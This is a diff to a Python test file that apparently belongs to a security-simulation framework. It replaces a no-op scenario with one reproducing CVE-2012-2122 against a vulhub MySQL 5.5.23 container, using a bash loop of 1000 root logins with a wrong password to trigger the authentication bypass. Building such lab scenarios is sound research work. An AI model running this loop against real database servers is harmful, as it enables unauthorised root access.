@@ -25,14 +25,29 @@ def test_subclass_scenario_implement_abstract():
     an exception
     """
     #pylint: disable=R0903
-    class DerivedScenario(Scenario):
-        """
-        a custom scenario with all required hooks
-        """
-        def exploit(self):
-            """
-            a sample exploit hook doing nothing
-            """
-        def wait_for_availability(self):
+    class CVE_2012_2122(Scenario):
+        def exploit(self, container):
+            subprocess.Popen(r'''#!/bin/bash
+                    for i in `seq 1 1000`;
+                    do
+                        mysql -uroot -pwrong -h 127.0.0.1 -P3306 ;
+                    done''', shell=True, executable='/bin/bash')
+
+        def wait_for_availability(self, container):
+            try:
+                db = pymysql.connect("localhost", "root", "123456")
+            except Exception:
+                print('MySQL Server is still down!')
+                return False
+            print('MySQL server is up - we can start simulating users!')
             return True
-    DerivedScenario('nginx')
+    CVE_2012_2122(
+        'vulhub/mysql:5.5.23',
+        port_mapping={
+            '3306/tcp' : 3306
+        },
+        warmup_time=15,
+        recording_time=45,
+        behaviours=[],
+        exploit_start_time=25 # Comment this line if you don't want the exploit to be executed
+    )
